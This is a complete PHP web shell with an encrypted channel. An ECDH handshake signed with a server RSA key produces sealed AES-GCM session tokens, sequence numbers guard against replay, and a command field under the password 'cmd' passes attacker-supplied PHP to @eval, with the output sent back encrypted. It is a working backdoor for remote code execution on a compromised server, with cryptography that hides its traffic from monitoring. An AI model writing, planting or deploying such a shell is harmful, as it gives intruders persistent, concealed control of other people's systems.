<?php

$pass = 'cmd';

header("Content-Type: application/json");

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $bytes = openssl_random_pseudo_bytes($length, $crypto_strong);
        if ($bytes === false || !$crypto_strong) {
            throw new Exception("Unable to generate secure random bytes");
        }
        return $bytes;
    }
}

if (!function_exists('hash_hkdf')) {
    function hash_hkdf($algo, $ikm, $length = 0, $info = '', $salt = '') {
        $digestLen = strlen(hash($algo, '', true));
        if ($salt === '') {
            $salt = str_repeat("\x00", $digestLen);
        }
        $prk = hash_hmac($algo, $ikm, $salt, true);
        $ret = '';
        $tmp = '';
        for ($i = 1; $i <= ceil($length / $digestLen); $i++) {
            $tmp = hash_hmac($algo, $tmp . $info . chr($i), $prk, true);
            $ret .= $tmp;
        }
        return substr($ret, 0, $length);
    }
}

function aes_encrypt($key, $data)
{
    $iv = random_bytes(12);
    $tag = '';
    
    $cipher = openssl_encrypt(
        json_encode($data), "aes-256-gcm", $key,
        OPENSSL_RAW_DATA, $iv, $tag
    );

    return $iv . $tag . $cipher;
}

function aes_decrypt($key, $raw)
{
    if (strlen($raw) < 28) return null; // 12(IV) + 16(TAG)

    $iv = substr($raw, 0, 12);
    $tag = substr($raw, 12, 16);
    $cipher = substr($raw, 28);

    $plain = openssl_decrypt(
        $cipher, "aes-256-gcm", $key,
        OPENSSL_RAW_DATA, $iv, $tag
    );

    if ($plain === false) return null;

    return json_decode($plain, true);
}

function find_openssl_conf()
{
    $candidates = array(
        "D:/xampp/apache/conf/openssl.cnf",
        "D:/xampp/php/extras/openssl/openssl.cnf",
        "C:/xampp/apache/conf/openssl.cnf",
        "C:/xampp/php/extras/openssl/openssl.cnf",
        "/etc/ssl/openssl.cnf",
        "/usr/lib/ssl/openssl.cnf",
        "/usr/local/etc/openssl/openssl.cnf",
        "/opt/homebrew/etc/openssl/openssl.cnf",
    );

    $env = getenv("OPENSSL_CONF");
    if ($env && file_exists($env)) return $env;

    $which = shell_exec("openssl version -d 2>/dev/null");
    if (!$which) $which = shell_exec("openssl version -d 2>nul");

    if ($which && preg_match('/OPENSSLDIR:\s*"([^"]+)"/', $which, $m)) {
        $path = rtrim($m[1], "/\\") . "/openssl.cnf";
        if (file_exists($path)) return $path;
    }

    $phpDir = defined('PHP_BINARY') ? dirname(PHP_BINARY) : '';
    if ($phpDir) {
        foreach (array($phpDir, dirname($phpDir)) as $base) {
            foreach (array("/extras/openssl/openssl.cnf", "/conf/openssl.cnf") as $suffix) {
                if (file_exists($base . $suffix)) return $base . $suffix;
            }
        }
    }

    foreach ($candidates as $path) {
        if (file_exists($path)) return $path;
    }

    return null;
}

$OPENSSL_CONF = find_openssl_conf();
if (!$OPENSSL_CONF) {
    if (function_exists('http_response_code')) {
        http_response_code(500);
    } else {
        header('HTTP/1.1 500 Internal Server Error');
    }
    echo json_encode(array("error" => "openssl.cnf not found"));
    exit;
}

function cache_get($key) {
    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
    if (!file_exists($file)) return false;
    $data = json_decode(file_get_contents($file), true);
    return isset($data['value']) ? $data['value'] : false;
}

function cache_set($key, $value) {
    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
    file_put_contents($file, json_encode(array('value' => $value)));
}

function get_master_keys($conf)
{
    $priv = cache_get("master_sign_priv");
    $pub  = cache_get("master_sign_pub");

    if (!$priv || !$pub) {
        $res = openssl_pkey_new(array(
            "private_key_bits" => 2048,
            "private_key_type" => OPENSSL_KEYTYPE_RSA,
            "config" => $conf,
        ));

        openssl_pkey_export($res, $priv, null, array("config" => $conf));
        $details = openssl_pkey_get_details($res);
        $pub = $details['key'];

        cache_set("master_sign_priv", $priv);
        cache_set("master_sign_pub",  $pub);
    }

    return array($priv, $pub);
}

function get_token_master_key()
{
    $key = cache_get("token_master_key");
    if (!$key) {
        $key = base64_encode(random_bytes(32));
        cache_set("token_master_key", $key);
    }
    return base64_decode($key);
}

function seal_token($data)
{
    $key = get_token_master_key();
    $iv = random_bytes(12);
    $plain = json_encode($data);
    $tag = '';

    $cipher = openssl_encrypt(
        $plain, "aes-256-gcm", $key,
        OPENSSL_RAW_DATA, $iv, $tag
    );

    return rtrim(strtr(base64_encode($iv . $tag . $cipher), '+/', '-_'), '=');
}

function open_token($token)
{
    $key = get_token_master_key();
    $token = strtr($token, '-_', '+/');
    $pad = strlen($token) % 4;
    if ($pad) $token .= str_repeat('=', 4 - $pad);

    $raw = base64_decode($token);
    if ($raw === false || strlen($raw) < 28) return null;

    $iv = substr($raw, 0, 12);
    $tag = substr($raw, 12, 16);
    $cipher = substr($raw, 28);

    $plain = openssl_decrypt(
        $cipher, "aes-256-gcm", $key,
        OPENSSL_RAW_DATA, $iv, $tag
    );

    if ($plain === false) return null;

    return json_decode($plain, true);
}

function jsonOut($data)
{
    echo json_encode($data);
    exit;
}

$method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$body = file_get_contents("php://input");

if ($method === 'GET') {

    $masterKeys = get_master_keys($OPENSSL_CONF);
    $signPriv = $masterKeys[0];
    $signPub  = $masterKeys[1];

    $res = openssl_pkey_new(array(
        "curve_name"       => "prime256v1",
        "private_key_type" => defined('OPENSSL_KEYTYPE_EC') ? OPENSSL_KEYTYPE_EC : OPENSSL_KEYTYPE_RSA,
        "config"           => $OPENSSL_CONF,
    ));
    openssl_pkey_export($res, $ecdhPriv, null, array("config" => $OPENSSL_CONF));
    $details = openssl_pkey_get_details($res);
    $ecdhPub = trim($details['key']);

    $sig = '';
    openssl_sign($ecdhPub, $sig, $signPriv, OPENSSL_ALGO_SHA256);

    $token = seal_token(array(
        "ecdh_priv" => $ecdhPriv,
        "created" => time(),
    ));

    jsonOut(array(
        "signPubKey" => $signPub,
        "serverEcdhPub" => $ecdhPub,
        "signature" => base64_encode($sig),
        "handshakeToken" => $token,
    ));
}

if ($method === 'POST') {

    $req = json_decode($body, true);

    if (isset($req['handshakeToken'], $req['clientEcdhPub'], $req['clientSignPub'], $req['clientSig'])) {
        $state = open_token($req['handshakeToken']);
        if (!$state)
            jsonOut(array("error" => "invalid or tampered token"));

        if (time() - $state['created'] > 300)
            jsonOut(array("error" => "handshake token expired"));

        $clientEcdhPub = trim($req['clientEcdhPub']);
        $clientSignPub = trim($req['clientSignPub']);
        $clientSig = base64_decode($req['clientSig']);

        $clientSignKey = openssl_pkey_get_public($clientSignPub);
        $valid = openssl_verify($clientEcdhPub, $clientSig, $clientSignKey, OPENSSL_ALGO_SHA256);

        if ($valid !== 1)
            jsonOut(array("error" => "client authentication failed"));

        $serverKey = openssl_pkey_get_private($state['ecdh_priv']);
        $clientKey = openssl_pkey_get_public($clientEcdhPub);
        
        $secret = openssl_pkey_derive($clientKey, $serverKey, 32);

        $aesKey = hash_hkdf("sha256", $secret, 32, "secure-channel");

        $sessionToken = seal_token(array(
            "aes_key" => base64_encode($aesKey),
            "last_seq" => 0,
            "seq_window" => array(),
            "client_sign_pub" => $clientSignPub,
        ));

        jsonOut(array("status" => "secure channel established", "sessionToken" => $sessionToken));
    }

    if (isset($req['sessionToken'], $req['payload'])) {

        $state = open_token($req['sessionToken']);
        if (!$state)
            jsonOut(array("error" => "invalid session token"));

        $aesKey = base64_decode($state['aes_key']);

        $raw = base64_decode($req['payload']);
        $cmd = aes_decrypt($aesKey, $raw);

        if (!isset($cmd['seq'], $cmd[$pass]))
            jsonOut(array("error" => "invalid request"));

        $seq = (int)$cmd['seq'];
        $window = $state['seq_window'];

        if ($seq <= $state['last_seq'] - 50)
            jsonOut(array("error" => "too old"));

        if (in_array($seq, $window, true))
            jsonOut(array("error" => "replay detected"));

        $window[] = $seq;
        if (count($window) > 50)
            array_shift($window);

        if ($seq > $state['last_seq'])
            $state['last_seq'] = $seq;

        $resp = array();
        switch ($cmd[$pass]) {
            case "eval":
                ob_start();
                @eval($cmd['data']);
                $info = ob_get_clean();
                $info = base64_encode($info);
                $resp = ["eval" => $info ?? null];
                break;
            default:
                $resp = array("error" => "unknown cmd");
        }

        $newToken = seal_token(array(
            "aes_key" => $state['aes_key'],
            "last_seq" => $state['last_seq'],
            "seq_window" => $window,
            "client_sign_pub" => $state['client_sign_pub'],
            "cwd" => isset($state['cwd']) ? $state['cwd'] : '.',
            "env" => isset($state['env']) ? $state['env'] : array(),
        ));

        $encResp = base64_encode(aes_encrypt($aesKey, $resp));

        header("Content-Type: application/json");
        echo json_encode(array("payload" => $encResp, "sessionToken" => $newToken));

        exit;
    }
}

jsonOut(array("error" => "invalid request"));

?>